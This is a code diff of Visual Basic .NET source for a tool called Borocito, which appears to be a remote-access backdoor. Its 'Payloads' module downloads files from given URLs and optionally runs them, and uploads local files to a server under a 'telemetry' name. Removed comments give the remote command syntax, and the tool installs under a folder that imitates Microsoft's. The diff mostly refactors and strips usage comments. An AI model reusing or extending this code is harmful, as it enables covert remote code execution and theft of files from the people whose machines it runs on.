@@ -45,13 +45,6 @@ Module Payloads
         End Try
     End Function
     Function DownloadComponent(ByVal URL As String, fileName As String, ByVal RunIt As Boolean, ByVal Args As String, Optional ByVal filePath As String = Nothing) As String 'WORKS! Last Check 03/05/2021 11:33PM
-        'Uso CMD: /Payloads.DownloadComponent=URL,fileName,True,NULL,null
-        'Descripcion
-        '   URL = url de descarga directa
-        '   fileName = nombre del archivo con su extencion
-        '   True/False = si debe ser ejecutado
-        '   args = indica argumentos para el inicio (solo en caso de RunIt=True)
-        '   (opcional) filePath = indica una ruta para almacenar el archivo
         Try
             filePath = filePath.Replace("%temp%", "C:\Users\" & Environment.UserName & "\AppData\Local\Temp")
             filePath = filePath.Replace("%localappdata%", "C:\Users\" & Environment.UserName & "\AppData\Local")
@@ -87,7 +80,6 @@ Module Payloads
         End Try
     End Function
     Function uploadAfile(ByVal filePath As String, Optional ByVal serverUpload As String = Nothing) As String
-        'Uso CMD: /Payloads.uploadAfile=localFilePath,{serverUploadPost/null}
         Try
             If serverUpload = Nothing Or serverUpload.ToLower = "null" Then
                 SendCustomTelemetryFile(filePath)
@@ -131,7 +123,6 @@ Module Payloads
     End Function
     Function PostNotify(ByVal TipTimeOut As SByte, ByVal TipTitle As String, ByVal TipText As String, ByVal TipIcon As SByte, ByVal iconPath As String) As String
         Try
-            '/Payloads.PostNotify=2,Hola,Como estas?, 1, C:\Windows\notepad.exe
             Dim newNotify As New NotifyIcon
             newNotify.Visible = True
             If iconPath <> Nothing Then
@@ -249,7 +240,7 @@ Module WindowsActions
             Return AddToLog("ProcessStop@WindowsActions", "Error: " & ex.Message, True)
         End Try
     End Function
-    Function ProcessGet(Optional ByVal procName As String = Nothing) As String 'Funciona 17/04/2022 09:30
+    Function ProcessGet(Optional ByVal procName As String = Nothing) As String 'Funciona 22/04/2022 19:23
         Try
             Dim retorno As String = Nothing
             retorno = vbCrLf
@@ -261,14 +252,11 @@ Module WindowsActions
                     End If
                 Next
             Else
-                Dim sAux() As String = procName.Split("'"c)
-                If sAux.Length = 3 Then
-                    Dim proc = Process.GetProcessesByName(sAux(1))
-                    If proc.Count > 0 Then
-                        retorno = "True (" & proc.Count & ")"
-                    Else
-                        retorno = "False"
-                    End If
+                Dim proc = Process.GetProcessesByName(procName)
+                If proc.Count > 0 Then
+                    retorno = "True (" & proc.Count & ")"
+                Else
+                    retorno = "False"
                 End If
             End If
             Return retorno
@@ -413,8 +401,8 @@ Module BOROGET
                 Dim args() As String = boroGETcommand.Split("|")
                 Return SetBOROGET(args(1), args(2))
             ElseIf boroGETcommand = "reset" Then
-                If My.Computer.FileSystem.DirectoryExists("C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-get") Then
-                    My.Computer.FileSystem.DeleteDirectory("C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-get", FileIO.DeleteDirectoryOption.DeleteAllContents)
+                If My.Computer.FileSystem.DirectoryExists(DIRBoroGetInstallFolder) Then
+                    My.Computer.FileSystem.DeleteDirectory(DIRBoroGetInstallFolder, FileIO.DeleteDirectoryOption.DeleteAllContents)
                 End If
                 Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
                 regKey.DeleteSubKeyTree("boro-get")
@@ -484,12 +472,12 @@ Module BOROGET
     End Function
     Function UninstallBOROGET() As String
         Try
-            'Eliminar
             AddToLog("BOROGET", "Uninstalling boro-get...", False)
+            'Eliminar directorio
             If My.Computer.FileSystem.DirectoryExists(DIRBoroGetInstallFolder) Then
                 My.Computer.FileSystem.DeleteDirectory(DIRBoroGetInstallFolder, FileIO.DeleteDirectoryOption.DeleteAllContents)
             End If
-            'Finalizar
+            'Eliminar registros
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             regKey.DeleteSubKeyTree("boro-get")
             Return "boro-get has been uninstalled!"
